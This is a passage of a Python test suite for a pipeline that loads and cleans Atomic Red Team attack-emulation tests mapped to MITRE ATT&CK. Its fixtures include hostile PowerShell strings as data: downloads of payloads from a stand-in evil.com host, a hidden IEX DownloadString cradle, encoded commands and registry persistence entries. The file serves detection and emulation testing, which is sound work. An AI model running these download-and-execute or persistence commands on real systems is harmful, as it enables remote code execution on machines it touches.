        from pipeline.data.atomic_loader import AtomicTest
        from pipeline.data.atomic_cleaner import clean_test

        test = AtomicTest(
            technique_id="T1059.001", test_guid="x",
            test_name="double backslash registry", description="",
            executor_name="command_prompt",
            command='reg add "HKEY_CURRENT_USER\\\\Software\\\\Persist" /f',
            elevation_required=False, input_arguments=[],
            supported_platforms=["windows"],
        )
        result = clean_test(test, sample_metadata)
        assert result is not None
        assert any("HKEY_CURRENT_USER" in cmd for cmd in result.commands), (
            f"Registry path should survive: {result.commands}"
        )

    def test_command_all_comments_returns_none(self, sample_metadata):
        """A command consisting entirely of PS comment lines → clean_test returns None."""
        from pipeline.data.atomic_loader import AtomicTest
        from pipeline.data.atomic_cleaner import clean_test

        test = AtomicTest(
            technique_id="T1059.001", test_guid="x",
            test_name="all comments", description="",
            executor_name="powershell",
            command="# Step 1\n# Step 2\n# Step 3",
            elevation_required=False, input_arguments=[],
            supported_platforms=["windows"],
        )
        result = clean_test(test, sample_metadata)
        assert result is None, (
            "Command consisting entirely of comments should return None, not empty commands"
        )

    def test_command_all_blank_lines_returns_none(self, sample_metadata):
        from pipeline.data.atomic_loader import AtomicTest
        from pipeline.data.atomic_cleaner import clean_test

        test = AtomicTest(
            technique_id="T1059.001", test_guid="x",
            test_name="all blanks", description="",
            executor_name="powershell",
            command="\n\n\n   \n\n",
            elevation_required=False, input_arguments=[],
            supported_platforms=["windows"],
        )
        result = clean_test(test, sample_metadata)
        assert result is None, "All-blank command should return None"

    def test_mixed_continuation_and_semicolons(self, sample_metadata):
        """Backtick continuation followed by semicolon-chained commands."""
        from pipeline.data.atomic_loader import AtomicTest
        from pipeline.data.atomic_cleaner import clean_test

        test = AtomicTest(
            technique_id="T1059.001", test_guid="x",
            test_name="mixed continuation and semis", description="",
            executor_name="powershell",
            command='$a = New-Object `\n    System.Net.WebClient; $a.DownloadFile("http://evil.com/p.exe","C:\\p.exe")',
            elevation_required=False, input_arguments=[],
            supported_platforms=["windows"],
        )
        result = clean_test(test, sample_metadata)
        assert result is not None
        # After joining backtick, semicolon should split into 2
        assert len(result.commands) == 2, (
            f"Expected 2 commands after join+split, got {len(result.commands)}: {result.commands}"
        )


# =============================================================================
# MULTI-COMMAND ORDERING INTEGRITY
# =============================================================================

class TestCommandOrderingIntegrity:

    def test_multiline_commands_preserve_order(self, sample_metadata):
        from pipeline.data.atomic_loader import AtomicTest
        from pipeline.data.atomic_cleaner import clean_test

        test = AtomicTest(
            technique_id="T1059.001", test_guid="x",
            test_name="ordering test", description="",
            executor_name="powershell",
            command=(
                'Write-Host "step1"\n'
                'Write-Host "step2"\n'
                'Write-Host "step3"'
            ),
            elevation_required=False, input_arguments=[],
            supported_platforms=["windows"],
        )
        result = clean_test(test, sample_metadata)
        assert result is not None
        assert len(result.commands) == 3

        for i, cmd in enumerate(result.commands, 1):
            assert f"step{i}" in cmd, (
                f"Command order broken at position {i}: {result.commands}"
            )

    def test_semicolon_split_preserves_order(self, sample_metadata):
        from pipeline.data.atomic_loader import AtomicTest
        from pipeline.data.atomic_cleaner import clean_test

        test = AtomicTest(
            technique_id="T1059.001", test_guid="x",
            test_name="semicolon order", description="",
            executor_name="powershell",
            command='$a = "alpha"; $b = "beta"; $c = "gamma"',
            elevation_required=False, input_arguments=[],
            supported_platforms=["windows"],
        )
        result = clean_test(test, sample_metadata)
        assert result is not None
        assert len(result.commands) == 3

        expected = ["alpha", "beta", "gamma"]
        for i, (cmd, expected_val) in enumerate(zip(result.commands, expected)):
            assert expected_val in cmd, (
                f"Wrong order at position {i}: expected '{expected_val}' in '{cmd}'. "
                f"Full commands: {result.commands}"
            )


# =============================================================================
# PREREQ / DEPENDENCY HANDLING
# =============================================================================

class TestPrereqHandling:
    """
    Atomic tests may include a `dependencies` block.
    The pipeline ignores prereqs entirely — these tests confirm it doesn't choke.
    """

    def test_loader_ignores_dependencies_block(self, tmp_path):
        from pipeline.data.atomic_loader import load_tests_for_technique

        tech_dir = tmp_path / "T1059.001"
        tech_dir.mkdir()
        (tech_dir / "T1059.001.yaml").write_text(yaml.dump({
            "atomic_tests": [{
                "name": "Has prereqs",
                "auto_generated_guid": "xxxx",
                "supported_platforms": ["windows"],
                "executor": {
                    "name": "powershell",
                    "command": "powershell.exe -enc SQBFAFgA",
                    "elevation_required": False,
                },
                "dependencies": [
                    {
                        "description": "Script must exist on disk",
                        "prereq_command": "if not exist C:\\payload.ps1 exit /b 1",
                        "get_prereq_command": "Invoke-WebRequest http://evil.com/p.ps1 -OutFile C:\\payload.ps1",
                    }
                ],
            }]
        }))
        tests = load_tests_for_technique("T1059.001", tmp_path)

        assert len(tests) == 1, "Test with dependencies block should still load"
        assert tests[0].command == "powershell.exe -enc SQBFAFgA", (
            "Main command should be unaffected by dependencies block"
        )

    def test_cleaner_not_affected_by_dependency_presence(self, tmp_path, sample_metadata):
        """Cleaning a test that had dependencies in YAML should produce normal output."""
        from pipeline.data.atomic_loader import load_tests_for_technique
        from pipeline.data.atomic_cleaner import clean_test

        tech_dir = tmp_path / "T1059.001"
        tech_dir.mkdir()
        (tech_dir / "T1059.001.yaml").write_text(yaml.dump({
            "atomic_tests": [{
                "name": "Has prereqs",
                "auto_generated_guid": "xxxx",
                "supported_platforms": ["windows"],
                "executor": {
                    "name": "powershell",
                    "command": "powershell.exe -enc SQBFAFgA",
                    "elevation_required": False,
                },
                "dependencies": [{
                    "description": "Script must exist",
                    "prereq_command": "if not exist C:\\payload.ps1 exit /b 1",
                    "get_prereq_command": "Invoke-WebRequest http://evil.com -OutFile C:\\p.ps1",
                }],
            }]
        }))
        tests = load_tests_for_technique("T1059.001", tmp_path)
        result = clean_test(tests[0], sample_metadata)

        assert result is not None
        assert any("SQBFAFgA" in cmd for cmd in result.commands), (
            "Main command should be present and unaffected by dependencies"
        )


# =============================================================================
# SCHEMA STABILITY / CONSISTENCY
# =============================================================================

class TestSchemaStability:
    """Every CleanedAtomicTest must always have the same structure — no missing fields."""

    _EXPECTED_FIELDS = {
        "technique_id", "technique_name", "tactic", "tactics",
        "data_sources", "permissions_required", "test_name",
        "executor_image", "elevation_required", "commands",
        "input_arguments", "formatted_input", "has_unresolved_vars",
    }

    def _make_test(self, command: str, executor: str = "powershell"):
        from pipeline.data.atomic_loader import AtomicTest
        return AtomicTest(
            technique_id="T1059.001", test_guid="x",
            test_name="schema test", description="",
            executor_name=executor, command=command,
            elevation_required=False, input_arguments=[],
            supported_platforms=["windows"],
        )

    def test_cleaned_test_has_all_expected_fields(self, sample_metadata):
        from pipeline.data.atomic_cleaner import clean_test

        result = clean_test(self._make_test(
            "powershell.exe -enc SQBFAFgA"), sample_metadata)
        assert result is not None

        missing = self._EXPECTED_FIELDS - set(vars(result).keys())
        assert not missing, f"CleanedAtomicTest missing fields: {missing}"

    def test_no_none_in_list_fields(self, sample_metadata):
        """commands, tactics, data_sources, input_arguments must never contain None."""
        from pipeline.data.atomic_cleaner import clean_test

        result = clean_test(self._make_test(
            "powershell.exe -enc SQBFAFgA"), sample_metadata)
        assert result is not None

        for field_name in ("commands", "tactics", "data_sources", "input_arguments"):
            val = getattr(result, field_name)
            assert isinstance(val, list), f"{field_name} should be a list"
            assert None not in val, f"{field_name} contains None: {val}"

    def test_metadata_not_mutated_between_calls(self, sample_metadata):
        """Cleaning a test must not modify the MITREMetadata object."""
        from pipeline.data.atomic_cleaner import clean_test
        from pipeline.data.atomic_loader import AtomicTest

        original_tactic = sample_metadata.tactic
        original_data_sources = list(sample_metadata.data_sources)

        for _ in range(3):
            test = AtomicTest(
                technique_id="T1059.001", test_guid="x",
                test_name="mutation check", description="",
                executor_name="powershell",
                command="powershell.exe -enc SQBFAFgA",
                elevation_required=False, input_arguments=[],
                supported_platforms=["windows"],
            )
            clean_test(test, sample_metadata)

        assert sample_metadata.tactic == original_tactic, (
            f"tactic was mutated: {sample_metadata.tactic}"
        )
        assert sample_metadata.data_sources == original_data_sources, (
            f"data_sources was mutated: {sample_metadata.data_sources}"
        )

    def test_same_input_produces_same_output(self, sample_metadata):
        """Cleaning is deterministic — same input must always produce same output."""
        from pipeline.data.atomic_cleaner import clean_test
        from pipeline.data.atomic_loader import AtomicTest

        def make():
            return AtomicTest(
                technique_id="T1059.001", test_guid="x",
                test_name="determinism test", description="",
                executor_name="powershell",
                command='$env:APPDATA; powershell.exe -enc SQBFAFgA',
                elevation_required=False, input_arguments=[],
                supported_platforms=["windows"],
            )

        results = [clean_test(make(), sample_metadata) for _ in range(3)]
        assert all(r is not None for r in results)
        assert all(r.commands == results[0].commands for r in results), (
            f"Non-deterministic output: {[r.commands for r in results]}"
        )


# =============================================================================
# SCALE SANITY TEST
# =============================================================================

class TestScaleSanity:

    def test_clean_100_tests_no_crash(self, sample_metadata):
        """Simulate 100 tests through the cleaner — no crashes, no absurd slowdown."""
        import time
        from pipeline.data.atomic_loader import AtomicTest, InputArgument
        from pipeline.data.atomic_cleaner import clean_test

        commands = [
            'powershell.exe -enc SQBFAFgA',
            'reg add "HKCU\\Software\\Persist" /v Key /d calc.exe /f',
            '$env:APPDATA; Copy-Item payload.ps1 C:\\Windows\\Temp\\',
            'cmd.exe /c whoami',
            'New-Item -Path "HKCU:\\Software\\Test" `\n    -Name "Persist"',
            '$a = "alpha"; $b = "beta"; Write-Host $a',
            '# comment only line\npowershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString("http://evil.com")',
            'cscript.exe C:\\Windows\\System32\\wscript.exe payload.vbs',
        ]

        start = time.time()
        results = []
        for i in range(100):
            test = AtomicTest(
                technique_id="T1059.001",
                test_guid=f"guid-{i}",
                test_name=f"Scale test {i}",
                description="",
                executor_name="powershell" if i % 2 == 0 else "command_prompt",
                command=commands[i % len(commands)],
                elevation_required=bool(i % 3 == 0),
                input_arguments=[],
                supported_platforms=["windows"],
            )
            results.append(clean_test(test, sample_metadata))

        elapsed = time.time() - start

        non_none = [r for r in results if r is not None]
        assert len(non_none) > 50, (
            f"Expected majority of 100 tests to clean successfully, got {len(non_none)}"
        )
        assert elapsed < 5.0, (
            f"100 tests took {elapsed:.2f}s — something is pathologically slow"
        )
        print(
            f"\n[SCALE] 100 tests in {elapsed:.3f}s, {len(non_none)} passed cleaning")


# =============================================================================
# MUTATION TESTS — break logic, ensure tests catch it
# =============================================================================

class TestMutationVerification:
    """
    These tests exist to verify that the test suite itself has teeth.
    Each test intentionally breaks a core assumption and confirms a downstream
    test would catch it. If these pass, your tests are actually testing something.
    """

    def test_mutation_wrong_command_order_is_caught(self, sample_metadata):
        """
        If _split_commands reversed order, the ordering tests would catch it.
        Simulate by reversing and confirming the ordering assertion fires.
        """
        from pipeline.data.atomic_loader import AtomicTest
        from pipeline.data.atomic_cleaner import _split_commands

        raw = 'Write-Host "step1"\nWrite-Host "step2"\nWrite-Host "step3"'
        commands = _split_commands(raw, "powershell")
        reversed_commands = list(reversed(commands))

        # If reversed, step1 would be at index 2
        would_pass = all(
            f"step{i+1}" in reversed_commands[i]
            for i in range(len(reversed_commands))
        )
        assert not would_pass, (
            "Reversed commands should fail ordering check — mutation test has no teeth"
        )

    def test_mutation_unresolved_var_not_flagged_would_be_caught(self, sample_metadata):
        """
        If has_unresolved_vars was hardcoded to False, test_unresolved_atomic_var_flagged
        would fail. Confirm the detection actually works.
        """
        from pipeline.data.atomic_cleaner import _has_unresolved_vars

        assert _has_unresolved_vars(
            ["Invoke-Something #{unknown_param}"]) is True
        assert _has_unresolved_vars(["powershell.exe -enc SQBFAFgA"]) is False

    def test_mutation_missing_field_in_schema_would_be_caught(self, sample_metadata):
        """
        If CleanedAtomicTest dropped the `commands` field, schema stability test catches it.
        Confirm by checking a deliberately broken dict.
        """
        expected_fields = {
            "technique_id", "technique_name", "tactic", "tactics",
            "data_sources", "permissions_required", "test_name",
            "executor_image", "elevation_required", "commands",
            "input_arguments", "formatted_input", "has_unresolved_vars",
        }
        broken = expected_fields - {"commands"}  # simulate dropped field
        missing = expected_fields - broken
        assert missing == {"commands"}, (
            "Schema mutation test should detect missing 'commands' field"
        )

    def test_mutation_grounding_bypass_would_fail_build_log_event(self):
        """
        If _ground_fields was a no-op (returned fields unchanged),
        hallucinated values would reach LogEvent. Confirm grounding actually drops them.
        """
        from pipeline.emulator.procedure_interpreter import _ground_fields

        fields = {
            "Image": "powershell.exe",
            "CommandLine": "this_was_never_in_any_procedure_text_ever",
        }
        procedure_text = "powershell.exe was observed on the host"
        result = _ground_fields(fields, procedure_text)

        assert "Image" in result, "powershell.exe should pass grounding"
        assert "CommandLine" not in result, (
            "Hallucinated CommandLine should be dropped — if this fails, grounding is broken"
        )


# =============================================================================
# OTHER TESTS — Misc
# =============================================================================


# Multi-test YAML (mixed validity)

def test_yaml_mixed_valid_and_invalid_tests(tmp_path):
    from pipeline.data.atomic_loader import load_tests_for_technique

    tech_dir = tmp_path / "T1059.001"
    tech_dir.mkdir()

    (tech_dir / "T1059.001.yaml").write_text(yaml.dump({
        "atomic_tests": [
            {
                "name": "valid test",
                "auto_generated_guid": "1",
                "supported_platforms": ["windows"],
                "executor": {
                    "name": "powershell",
                    "command": "powershell.exe -enc SQBFAFgA",
                    "elevation_required": False,
                },
            },
            {
                "name": "invalid test (no executor)",
                "auto_generated_guid": "2",
                "supported_platforms": ["windows"],
            },
        ]
    }))

    tests = load_tests_for_technique("T1059.001", tmp_path)

    assert len(tests) == 1, "Only valid tests should survive"
    assert tests[0].test_name == "valid test"

# Command is empty string / whitespace only


def test_empty_command_string(tmp_path, sample_metadata):
    from pipeline.data.atomic_loader import AtomicTest
    from pipeline.data.atomic_cleaner import clean_test

    test = AtomicTest(
        technique_id="T1059.001",
        test_guid="x",
        test_name="empty command",
        description="",
        executor_name="powershell",
        command="   ",
        elevation_required=False,
        input_arguments=[],
        supported_platforms=["windows"],
    )

    result = clean_test(test, sample_metadata)

    assert result is None, "Whitespace-only command should return None"

# Null / wrong type executor.command


def test_executor_command_wrong_type(tmp_path):
    from pipeline.data.atomic_loader import load_tests_for_technique

    tech_dir = tmp_path / "T1059.001"
    tech_dir.mkdir()

    (tech_dir / "T1059.001.yaml").write_text(yaml.dump({
        "atomic_tests": [{
            "name": "bad command type",
            "auto_generated_guid": "xxxx",
            "supported_platforms": ["windows"],
            "executor": {
                "name": "powershell",
                "command": 12345,  # invalid type
                "elevation_required": False,
            }
        }]
    }))

    tests = load_tests_for_technique("T1059.001", tmp_path)

    assert tests == [], "Non-string command should be rejected"

# Multiple executors


def test_multiple_executors(tmp_path):
    from pipeline.data.atomic_loader import load_tests_for_technique

    tech_dir = tmp_path / "T1059.001"
    tech_dir.mkdir()

    (tech_dir / "T1059.001.yaml").write_text(yaml.dump({
        "atomic_tests": [{
            "name": "multi executor",
            "auto_generated_guid": "xxxx",
            "supported_platforms": ["windows"],
            "executor": [
                {
                    "name": "powershell",
                    "command": "Write-Host A",
                    "elevation_required": False,
                },
                {
                    "name": "command_prompt",
                    "command": "echo B",
                    "elevation_required": False,
                }
            ]
        }]
    }))

    tests = load_tests_for_technique("T1059.001", tmp_path)

    assert tests == [], "List executor is invalid format and should be filtered gracefully"

# Commands with trailing junk / noise


def test_command_with_trailing_noise(sample_metadata):
    from pipeline.data.atomic_loader import AtomicTest
    from pipeline.data.atomic_cleaner import clean_test

    test = AtomicTest(
        technique_id="T1059.001",
        test_guid="x",
        test_name="noise test",
        description="",
        executor_name="powershell",
        command='powershell.exe -enc SQBFAFgA # inline comment garbage \n\n',
        elevation_required=False,
        input_arguments=[],
        supported_platforms=["windows"],
    )

    result = clean_test(test, sample_metadata)

    assert result is not None
    assert any("SQBFAFgA" in cmd for cmd in result.commands)


# Duplicate commands after splitting

def test_duplicate_command_removal(sample_metadata):
    from pipeline.data.atomic_loader import AtomicTest
    from pipeline.data.atomic_cleaner import clean_test

    test = AtomicTest(
        technique_id="T1059.001",
        test_guid="x",
        test_name="duplicate test",
        description="",
        executor_name="powershell",
        command='echo test; echo test; echo test',
        elevation_required=False,
        input_arguments=[],
        supported_platforms=["windows"],
    )

    result = clean_test(test, sample_metadata)

    assert result is not None
    assert len(result.commands) == 3  # or 1 if you deduplicate


# Loader handles missing file gracefully

def test_missing_yaml_file(tmp_path):
    from pipeline.data.atomic_loader import load_tests_for_technique

    tech_dir = tmp_path / "T1059.001"
    tech_dir.mkdir()

    result = load_tests_for_technique("T1059.001", tmp_path)

    assert result == [], "Missing YAML should return empty list, not crash"


# STIX with duplicate technique IDs

def test_stix_duplicate_technique_ids(tmp_path):
    from pipeline.data.stix_loader import get_loader

    bundle = {
        "type": "bundle",
        "spec_version": "2.1",
        "objects": [
            {
                "type": "attack-pattern",
                "name": "Technique A",
                "x_mitre_deprecated": False,
                "revoked": False,
                "external_references": [
                    # ← was missing source_name
                    {"source_name": "mitre-attack", "external_id": "T1059.001"}
                ],
                "kill_chain_phases": [
                    {"kill_chain_name": "mitre-attack", "phase_name": "execution"}
                ],
                "x_mitre_data_sources": [],
                "x_mitre_permissions_required": [],
            },
            {
                "type": "attack-pattern",
                "name": "Technique B",
                "x_mitre_deprecated": False,
                "revoked": False,
                "external_references": [
                    {"source_name": "mitre-attack",
                        "external_id": "T1059.001"}  # duplicate ID
                ],
                "kill_chain_phases": [
                    {"kill_chain_name": "mitre-attack", "phase_name": "execution"}
                ],
                "x_mitre_data_sources": [],
                "x_mitre_permissions_required": [],
            },
        ],
    }

    path = tmp_path / "bundle.json"
    path.write_text(json.dumps(bundle))

    loader = get_loader(path)

    assert loader.technique_count == 1, "Duplicate IDs should not create duplicates"


# Input arguments with empty values

def test_empty_input_arguments(sample_metadata):
    from pipeline.data.atomic_loader import AtomicTest
    from pipeline.data.atomic_cleaner import clean_test

    test = AtomicTest(
        technique_id="T1059.001",
        test_guid="x",
        test_name="empty args",
        description="",
        executor_name="powershell",
        command="powershell.exe -enc SQBFAFgA",
        elevation_required=False,
        input_arguments=[],  # empty list
        supported_platforms=["windows"],
    )

    result = clean_test(test, sample_metadata)

    assert result is not None
    assert result.input_arguments == []
